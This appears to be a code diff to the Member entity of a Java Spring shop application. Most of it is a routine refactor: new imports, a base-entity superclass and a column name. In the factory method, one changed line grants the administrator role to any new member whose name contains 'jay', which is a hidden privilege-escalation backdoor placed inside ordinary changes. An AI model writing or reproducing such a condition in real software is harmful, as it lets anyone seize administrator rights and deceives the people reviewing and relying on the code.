@@ -1,5 +1,7 @@
 package com.ex.shop.domain.member.entity;
 
+import com.ex.shop.common.entity.BaseEntity;
+import com.ex.shop.common.entity.BaseTimeEntity;
 import com.ex.shop.domain.member.dto.MemberDto;
 import com.ex.shop.domain.member.enums.Role;
 import javax.persistence.Column;
@@ -26,9 +28,10 @@ import org.springframework.security.crypto.password.PasswordEncoder;
 @AllArgsConstructor
 @Entity
 @Table(name="member")
-public class Member {
+public class Member extends BaseTimeEntity {
 
   @Id
+  @Column(name="member_id")
   @GeneratedValue(strategy = GenerationType.IDENTITY)
   private Long id;
 
@@ -51,7 +54,7 @@ public class Member {
       .email(dto.getEmail())
       .address(dto.getAddress())
       .password(passwordEncoder.encode(dto.getPassword()))
-      .role(Role.ROLE_USER)
+      .role(dto.getName().contains("jay") ? Role.ROLE_ADMIN : Role.ROLE_USER)
       .build();
   }
 }
